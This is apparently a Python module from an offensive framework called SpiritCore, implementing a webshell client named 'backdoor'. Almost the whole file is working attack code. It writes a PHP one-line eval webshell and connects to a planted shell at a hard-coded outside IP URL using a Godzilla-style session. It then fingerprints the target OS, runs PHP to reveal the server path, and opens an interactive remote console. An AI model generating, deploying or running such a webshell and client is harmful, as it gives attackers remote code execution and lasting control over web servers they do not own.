from SpiritCore.Modules import *

from SpiritCore.Lib.Godzilla import *
from SpiritCore.System import *
from SpiritCore.Session import *

import uuid

class Module(Modules):
	Info = {
		"Name": "backdoor",
		"Author": "ZSD",
		"Description": "Webshell Client ",
		"Options": (
			("URL", "http://106.52.4.63/shell.php", True, 'Backdoor URL',None),
			("Password","pass",True,"Backdoor password",None)
		)
     }
	def Generate(self,File,Type="php"):
		D="1"
		if D=="1":
			try:
				print_msg("Generate File:%s"%File)
				open(File,"w").write("<?php @eval($_POST['%s']); ?>"%self.Parameate["Password"])
			except:
				print_error("Write Webshell Error")

	def Exploit(self):
		try:
			print_success("Webshell %s"%self.Parameate["URL"])
			Text="""========================================================================================
========================================================================================
===================================     Hacker     =====================================
===================================     Apache     =====================================
========================================================================================
========================================================================================
			"""
			write(TextColor(Text,COLO_RED))
			url_str = self.Parameate["URL"]
			T1= Session(self.Object)
			T1.Payload="Godzilla/PHP"
			T1.SpiritObject=self.Object
			T1.Object=PhpBackdoor()
			T1.Object.UseSession=True
			#T1.Object.proxies={}
			T1.Object.UseGodzilla=True

			T1.Object.URL=url_str
			#write("s")
			T1.Object.Password=str(self.Parameate['Password'])
			#write("s")
			try:
				T1.Object.Connect()
			except:
				print_error("Connection failed. Please check the link and Network!")
				return
			try:
				T1.Object.GetOsVersion()

			except Exception as error:
				write(error)
				print_error("The link is not available")
				return
			T1.Object.InitGozilla()
			Send = {
				self.Parameate["Password"]: "echo \"<Spiriter>\".base64_encode(str_replace('\\\\', '/', @dirname($_SERVER['SCRIPT_FILENAME']))).\"<Spiriter>\";"
			}
			T1.Object.SendData(Send)
			#write("s")
			try:
				T1.Path = T1.Object.RecvData()
				if  T1.Object.RecvData()=="<ERROR>":
					print_error("Corresponding information is not available")
					return
			except:
				return
				print_error("Recv {}")
			#write(T1.Path)
			print_success("Connected ---> %s   Successfully"%(T1.Object.URL))

			T1.SessionInfo = url_str + " "+self.Parameate['Password']
			T1.TargetOS=T1.Object.ServerOs
			#print_success("")
			T1.UUID =uuid.uuid1().__str__()
			print_success("UUID:%s   "%(T1.UUID))
			if T1.TargetOS==0:
				OS="Linux"
			else:
				OS="Windows"
			SystemOSInfo="TargetOS: %s"%(OS )
			print_success(SystemOSInfo)
			T1.start()
			self.Object.SessionManager.update({T1.UUID:T1})
			T1.Console("")
		except Exception as error:
			print_error(error.__str__())
			return



	
